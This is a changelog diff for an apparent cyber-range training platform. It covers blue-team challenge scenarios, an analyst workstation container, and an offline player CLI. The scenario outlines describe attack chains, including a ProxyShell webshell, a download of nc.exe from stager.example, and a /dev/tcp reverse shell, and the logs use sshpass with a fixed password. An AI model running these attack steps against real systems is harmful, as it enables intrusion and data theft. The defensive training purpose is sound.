+ProxyShell, CVE-2021-34473 / -34523 / -31207):
+* Prompt ``[PS] C:\\Windows\\system32> `` (EMS pre-warmed).
+* Story — AutoDiscover SSRF
+  (``REDACTED?@<DOMAIN>/Powershell``) →
+  Exchange PowerShell remoting as SYSTEM →
+  ``New-MailboxExportRequest`` for cfo and hr mailboxes → .pst
+  files written to ``\\\\EXCH-01\\c$\\inetpub\\wwwroot\\aspnet_client\\system_web\\``
+  alongside a ``REDACTED`` webshell.
+* Cmdlets — ``Get-ExchangeServer``, ``Get-Mailbox``,
+  ``Get-MailboxExportRequest`` (+ ``-Identity`` for detail),
+  ``Get-RoleGroupMember "Organization Management"``,
+  ``Get-ChildItem`` of the aspnet_client path, synthetic
+  ``Get-IISAccessLog``, ``Get-WinEvent``.
+* T1190, T1505.003, T1114.002, T1567.
+
+**``windows-iis-live``** (d3, 550pt) — IIS-WEB-01, Windows Server
+2019 IIS 10 hosting a public ASP.NET app:
+* Story — profile-photo upload accepted ``.aspx`` → webshell at
+  ``REDACTED`` (cmd-wrapper source visible
+  via ``Get-Content``) → w3wp spawns ``REDACTED`` → PowerShell
+  ``Invoke-WebRequest`` to ``http://stager.example/nc.exe`` →
+  ``%TEMP%\\nc.exe REDACTED 1433`` to pivot to internal MSSQL.
+* Cmdlets — ``Get-IISAccessLog``, ``Get-WinEvent``,
+  ``Get-Process``, ``Get-NetTCPConnection``, ``Get-ChildItem`` +
+  ``Get-Content`` of the webshell.
+* T1505.003, T1190, T1059.003, T1105, T1021.002.
+
+**``linux-syslog-live``** (d3, 550pt) — lnx-web-02, RHEL 9.3 with
+Apache + Tomcat. **First non-Windows host on the live track.**
+* Prompt: ``[hunter@lnx-web-02 ~]$ `` via ``PROMPT_FORMAT``.
+* Story — SSH brute force from REDACTED lands as
+  ``REDACTED`` (243 failures → success in /var/log/secure) →
+  REDACTED privesc (SUID, unpatched CVE-2021-4034 family) → cron
+  persistence at ``/etc/cron.d/REDACTED`` running
+  ``/usr/local/bin/REDACTED.sh`` every minute → ``/dev/tcp``
+  reverse shell to REDACTED.
+* Commands — ``who``, ``last``, ``journalctl``,
+  ``cat /var/log/secure``, ``cat /etc/cron.d/<name>``,
+  ``cat /usr/local/bin/<name>.sh``, ``find / -perm -4000``,
+  ``ps -ef``, ``ss -tnp``, ``ausearch``. Pipes via
+  ``| include`` / ``| match`` / ``| count`` work transparently —
+  not native to bash but pedagogically equivalent.
+* T1110, T1078, T1068, T1053.003, T1071.001.
+
+**Engine drift status** — ``shell.py`` byte-identical across **16
+live challenges** now (10 network device + 5 Windows + 1 Linux).
+Zero engine changes in this drop. Per-device hooks have absorbed
+every CLI family without touching the core.
+
+**Catalogue after this drop**: **47 challenges (25 blue, 22 red)** —
+blue overtakes red. Live-shell track covers Cisco IOS / Cisco IOS
+XE / Cisco ASA / FortiOS / PAN-OS / Juniper Junos / MikroTik
+RouterOS / F5 BIG-IP / Citrix NetScaler / pfSense / Windows DC /
+Windows endpoint / Windows file server / Exchange / IIS / Linux
+RHEL — **16 host scenarios** on one shell engine.
+
+## Analyst workstation + offline player runner (2026-05-17)
+
+Two new pieces to remove the "I need VPN to my corp jumpbox"
+dependency from the player experience. Different layers; both
+ship in the same drop.
+
+### `infra/workstation/` — in-range analyst container
+
+A container that lives on the same ``siege-range`` docker network
+as every challenge. Player connects to it from anywhere — public
+SSH on :2222 or browser web-shell at ``/workstation/`` via nginx
+reverse-proxy to ttyd on :7681 — and works from there. No VPN
+needed; the workstation **is** the jumpbox.
+
+* **Base** — Ubuntu 22.04. Non-root ``analyst`` user; sudo
+  NOPASSWD allowlist limited to ``tcpdump`` / ``tshark`` / ``nmap``.
+* **Toolchain** — bash + zsh + tmux + vim-tiny + less; ssh-client +
+  sshpass; curl + wget + nc; nmap + tcpdump + tshark + dnsutils +
+  mtr; jq + ripgrep + ag + xxd + file; python3 + pip;
+  PowerShell 7 (Microsoft package — Windows-challenge cmdlets
+  dry-run locally before paste into live device shells).
+* **Web shell** — ttyd 1.7.7 single-binary, basic-auth credential
+  pulled from ``SIEGE_WORKSTATION_PASSWORD`` env. Same password
+  works for SSH.
+* **Pre-configured SSH** — ``~/.ssh/config`` aliases every live
+  challenge slug to its orchestrator-assigned container DNS name.
+  Player types ``ssh dc01`` / ``ssh fortigate`` / ``ssh exch-01``
+  and lands at the hunter prompt without thinking about ports or
+  container names.
+* **MOTD** — quick-reference banner with the seige CLI verbs, the
+  ssh aliases, and the tools-onboard list.
+* **Compose** — ``infra/workstation/docker-compose.workstation.yml``
+  overlays onto the main stack, joins the external
+  ``siege-range`` network. Make targets: ``make workstation-build``
+  / ``make workstation-up`` / ``make workstation-down`` /
+  ``make workstation-shell``.
+
+### `scripts/seige` — offline player CLI
+
+Single-file Python CLI (stdlib only, ~300 lines) that lets a
+player run any live-shell challenge **as a standalone Docker
+container on their laptop**. No central seige-range needed at
+all — useful for the air-gapped end of the spectrum (no internet,
+no VPN, no public seige host reachable).
+
+Commands: ``list`` / ``info`` / ``start`` / ``connect`` /
+``questions`` / ``answer`` / ``remember`` / ``reveal`` / ``stop``
+/ ``reset`` / ``score`` / ``pull``. State persisted to
+``~/.seige/state.json``; per-slug records: started_at,
+container, host_port, answers, solved_at, flag.
+
+Challenge discovery walks ``challenges/*/challenge.json``; only
+entries with a present ``Dockerfile`` are runnable. Validators
+hit via ``docker exec <container> /usr/local/bin/answer ...`` so
+no extra ports are published — the validator stays loopback-only
+inside the container.
+
+### `scripts/build-offline-bundle.sh` — portable bundle
+
+Pre-builds every runnable image, ``docker save``-s them into one
+deduped tarball, copies the ``seige`` CLI + a stub challenge
+manifest tree + the operator runbook, then ``zstd``-compresses
+the lot into a single ``seige-offline-<DATE>.tar.zst``. Sized
+~1.6 GB compressed for the full catalogue; trims cleanly to a
+single track if needed by editing the slug allowlist.
+
+Reload on a target host: ``tar --use-compress-program=unzstd
+-xvf <bundle>.tar.zst && cd <bundle> && ./load-images.sh``.
+
+### `docs/runbooks/offline-workstation.md` — operator guide
+
+Three usage tiers documented end-to-end:
+
+| Scenario | Tool |
+|---|---|
+| Office, full VPN | Platform web UI |
+| Customer site, public internet | Analyst workstation (SSH or `/workstation/`) |
+| Plane, no internet | Offline bundle on laptop Docker |
+| Locked-down laptop, no SSH client | Analyst workstation, browser only |
+
+The workstation and the offline CLI are complementary, not
+duplicative: the workstation is the **online-but-VPN-less** path
+(player reaches a remote workstation that's already in the range);
+the offline CLI is the **fully-disconnected** path (everything
+runs on the player's laptop). State syncs back to the central
+platform manually — a future ``seige sync`` is the obvious
+follow-up.
+
+## Workstation follow-ups: sync, persistence, UI (2026-05-17)
+
+Three follow-ups to the offline-runner + analyst-workstation pair
+the user asked for in the next iteration.
+
+### `seige sync --upstream URL` — push offline solves back
+
+CLI subcommand that reads ``~/.seige/state.json``, exchanges the
+operator's username/password for a JWT access token via
+``POST <URL>/api/v1/auth/login``, then POSTs each unsynced flag
+to ``POST <URL>/api/v1/challenges/<slug>/submit``. The platform's
+submission endpoint treats already-credited solves as **409
+Conflict** — we treat that as success (the offline run beat the
+platform to it, or the player re-ran). Both 200 and 409 paths
+stamp ``synced_at`` so subsequent ``seige sync`` calls are
+no-ops. Failures keep the row unsynced for retry. Password is
+``getpass.getpass``-prompted (or ``SEIGE_PASSWORD`` env); the
+token lives in memory only — never written to ``state.json``.
+
+### Per-player home volume
+
+* ``infra/workstation/docker-compose.workstation.yml`` mounts a
+  named volume ``seige-workstation-home-shared`` at
+  ``/home/analyst``.
+* The Dockerfile now ships the SSH config + a minimal ``.bashrc``
+  under ``/opt/analyst-skel/`` (a volume mount would mask
+  ``/home/analyst/*`` contents).
+* ``entrypoint.sh`` seeds the live home from the skeleton
+  **only when the volume is empty** — so analyst notes /
+  history / scripts / ``~/.seige/state.json`` survive container
+  restarts, but the baked-in ``~/.ssh/config`` and motd-printing
+  bashrc are always present on first run.
+* Per-player isolation in the platform-launched path (next
+  section) uses ``seige-workstation-home-<user_id>`` keyed on
+  the player's id.
+
+### Launch-Workstation UI — backend + frontend
+
+* ``backend/app/services/workstation.py`` (~140 LoC) — launches a
+  per-user container ``seige-workstation-<user_id>`` through the
+  existing ``docker_client`` (talks via the docker-socket-proxy).
+  State is derived from Docker (no DB table — workstations are
+  ephemeral; the orchestrator's docker view is the source of
+  truth). Generates a fresh 20-char alphanumeric password on
+  every launch and returns it **one-shot** in the API response;
+  never persists the password on disk or in the DB. Mounts
+  ``seige-workstation-home-<user_id>`` at ``/home/analyst`` so
+  notes survive restart. Stop is idempotent; volume is preserved.
+* ``backend/app/routers/v1/workstation.py`` — three endpoints
+  behind ``get_current_user``:
+  * ``GET  /api/v1/workstation/status``
+  * ``POST /api/v1/workstation/launch`` → status + ``one_shot_password``
+  * ``POST /api/v1/workstation/stop``
+  Wired into ``app.routers.v1.__init__.router``. Pydantic DTOs
+  with ``extra="forbid"`` to match the rest of the v1 surface.
+* ``frontend/src/pages/Workstation.jsx`` — new ``/workstation``
+  route. When stopped: single "Launch Workstation" button. When
+  running: SSH command (copy-able), ttyd web URL (clickable),
+  one-shot password panel with a "capture it now" warning,
+  ``window.confirm``-gated Stop button. Polls status on mount.
+* ``Layout.jsx`` gained a Workstation entry between Rankings and
+  Deploy in the top nav. ``App.jsx`` route wired.
+
+All three changes parse clean under esbuild (frontend) and
+Python ``ast.parse`` (backend). Existing endpoints/tests
+unmodified — additive only. Operator deploys via ``make
+workstation-build`` once; per-player launches happen on demand
+through the UI button.
+
+## Workstation ↔ per-instance network reachability (2026-05-17)
+
+End-to-end demo of the workstation feature surfaced one missing
+piece: the workstation landed on DinD's default bridge, while
+each challenge launches on its own per-instance bridge. So
+``ssh dc01`` from inside the workstation had nothing to resolve.
+
+Two coordinated fixes shipped:
+
+**1. Launcher pins each challenge's slug as a network alias.**
+``backend/app/services/orchestration/launcher.py`` — right after
+the post-pull-digest verification succeeds, a brief
+disconnect-then-reconnect sets the challenge container's docker
+DNS alias on its per-instance network to its slug. Best-effort
++ logged: alias-set failures don't block the launch (the player
+can still SSH by the full container name as a fallback).
+
+**2. Launcher attaches the user's workstation to the network.**
+Same hook, immediately after the alias pin. Calls
+``app.services.workstation.attach_to_network(user_id, network_name)``.
+The helper looks up the user's ``seige-workstation-<user_id>``
+container, checks it's running, and calls ``network.connect()``
+with alias ``workstation``. UX-only: any failure is swallowed
+and logged.
+
+**Engine cleanup found while demoing**:
+* ``docker-compose.yml`` — added ``VOLUMES=1`` to the
+  ``docker-socket-proxy`` allowlist so the API can create
+  ``seige-workstation-home-<user_id>`` volumes.
+* ``infra/workstation/Dockerfile`` — fixed two paths and a
+  PATH issue surfaced by the build:
+  * ``COPY`` lines anchored to the repo-root build context
+    (``infra/workstation/motd`` etc., not bare ``motd``).
+  * ``PATH=`` now includes ``/usr/sbin:/sbin`` so ``useradd``
+    resolves; added ``passwd`` package explicitly.
+* ``backend/app/services/workstation.py`` —
+  * ``NETWORK_NAME`` defaults to ``None`` (docker default
+    bridge); per-instance attach happens on demand from the
+    launcher hook.
+  * ``launch()`` now sweeps any stale Created/Exited container
+    with the same name before creating fresh, so a half-failed
+    launch doesn't block the next attempt.
+* ``infra/workstation/ssh-config`` — dropped the per-challenge
+  alias table. Single ``Host *`` block with hunter/:2222
+  defaults plus StrictHostKeyChecking guards. Players type
+  ``ssh dc01`` / ``ssh fortigate`` / etc.; docker DNS resolves
+  the alias against the per-instance network the workstation
+  is currently attached to.
+
+**Verified end-to-end on the live dev box**:
+
+```
+$ POST /api/v1/workstation/launch
+  -> {running:true, ssh_host_port:32773, web_host_port:32772,
+      one_shot_password:"..."}
+
+$ POST /api/instances/tier-2-impact/launch
+  -> {id:40, status:"running", port:10036}
+
+$ docker inspect seige-workstation-1
+  Networks:
+    bridge
+    siege-ch-1-tier-2-impact-04372c5d   ← attached by launcher hook
+
+$ docker exec seige-workstation-1 getent hosts tier-2-impact
+  172.18.0.2  tier-2-impact
+
+$ docker exec --user analyst seige-workstation-1 \
+      sshpass -p hunter ssh tier-2-impact \
+      'whoami; ls ~/logs/'
+  hunter
+  ad_changes.log  deletion_audit.log  filesystem_changes.log
+  sysmon.json     wipe_audit.log
+```
+
+``ssh <slug>`` muscle memory now works natively from the analyst
+workstation. No port numbers, no container hashes — just the
+slug.
+
+**Carry-overs flagged**:
+* When a challenge is *stopped*, the orchestrator removes the
+  network, implicitly disconnecting the workstation. On the
+  next launch the workstation re-attaches. Tested with serial
+  launches; concurrent launches against the same workstation
+  should be fine (each connect is atomic) but not load-tested.
+* The brief disconnect-then-reconnect window in the launcher
+  drops any in-flight TCP on the challenge container's network
+  endpoint. Acceptable for the < 1 sec window between container
+  start and player connection; worth keeping in mind for
+  long-running daemon challenges.
+* nginx reverse-proxy at ``/workstation/<user_id>/`` →
+  per-user ttyd port still pending. Players currently use the
+  raw ttyd port from the launch response.
+
+## Workstation host-reachability + clearer connect UX (2026-05-17)
+
+Two follow-ups from the previous demo, both shipped.
+
+### #1 — Eliminate the disconnect-reconnect blip
+
+``backend/app/services/orchestration/launcher.py`` — replaced the
+post-start ``disconnect → connect(aliases=[slug])`` dance with
+``containers.create() → networks.connect(c, aliases=[slug]) →
+container.start()``. The slug alias is set **before** the
+container ever has a network endpoint, so there is no momentary
+TCP drop. Containers.create attaches to the default ``bridge`` —
+we disconnect it before connecting to the per-instance network
+with the alias. Existing error-cleanup path preserves the
+sidecar-teardown + network-remove unwinds.
+
+### #2 — Workstation reachable from the player's laptop
+
+The previous demo bound the workstation's ttyd + sshd to random
+``127.0.0.1`` host ports **inside DinD**, not reachable from
+outside the DinD container. Fixed by:
+
+* **``docker-compose.dev.yml``** — orchestrator now publishes two
+  new port ranges:
+  * ``11000-11099:11000-11099`` for per-user ttyd web shells
+  * ``11100-11199:11100-11199`` for per-user SSH
+* **``backend/app/services/workstation.py``** —
+  * ``WEB_PORT_BASE = 11000`` / ``SSH_PORT_BASE = 11100``.
+  * Bind with explicit deterministic host ports:
+    ``0.0.0.0:11000+user_id:7681`` and
+    ``0.0.0.0:11100+user_id:2222``.
+  * Each player now has a **stable URL** that survives
+    workstation restart: ``http://<host>:11000+user_id/``.
+* **``backend/app/routers/v1/workstation.py``** — launch / status
+  / stop responses gained two computed fields, ``ssh_command``
+  and ``web_url``, derived server-side from the request's
+  ``Host`` header. Works behind reverse proxies + whichever
+  front-door the player reached the platform through.
+* **``frontend/src/pages/Workstation.jsx``** — prefers the
+  backend-rendered connection strings; falls back to
+  ``window.location.hostname`` if absent. Plus a new numbered
+  **"how to connect"** panel right under the connection details
+  spelling out the four-step flow (web shell or SSH → seige list
+  → ssh <slug> → answer / reveal). Removes the
+  "you're not directed how to connect" gap.
+
+**Verified end-to-end on the live dev box**:
+
+```
+$ POST /api/v1/workstation/launch
+  -> ssh_host_port: 11101
+     web_host_port: 11001
+     ssh_command:   "ssh -p 11101 analyst@localhost"
+     web_url:       "http://localhost:11001/"
+
+$ curl -u analyst:<pw> http://localhost:11001/       → HTTP 200 ✓
+$ sshpass -p <pw> ssh -p 11101 analyst@localhost     → MOTD + bash ✓
+
+$ POST /api/instances/tier-2-impact/launch
+$ docker inspect seige-workstation-1 (Networks)
+    bridge
+    siege-ch-1-tier-2-impact-56c207d0  ← attached by launcher hook
+
+$ sshpass -p <pw> ssh -p 11101 analyst@localhost \
+      "sshpass -p hunter ssh tier-2-impact 'ls ~/logs/'"
+  ad_changes.log  deletion_audit.log  filesystem_changes.log
+  sysmon.json     wipe_audit.log
+```
+
+Full chain host-laptop → workstation → challenge-by-slug now
+works end-to-end with the connection details visible in the
+launch response and a step-by-step "how to connect" panel on the
+``/workstation`` page.
+
+**Operator caveat** for prod: the dev compose publishes
+``11000-11199`` to the host directly. Production deployments
+should either (a) leave those bound to ``127.0.0.1`` and
+reverse-proxy via nginx with platform-auth gating, or (b)
+firewall them off and tunnel via SSH-over-the-platform.
+
+**Carry-overs**:
+* Orchestrator recreate wipes DinD state — every active
+  challenge instance + workstation goes with it. The launch
+  hook re-attaches on the next challenge launch but stale
+  ``ChallengeInstance`` DB rows can block re-launches until the
+  cleanup-watcher reaps them (or admin DELETE
+  ``/api/instances/<id>``). Worth a small startup sweep that
+  marks all running instances as ``expired`` when the
+  orchestrator restarts. Not in this drop.
+* The nginx ``/workstation/<user_id>/`` reverse-proxy is still
+  pending. With the deterministic port range the route is a
+  simple regex location block — small follow-up.
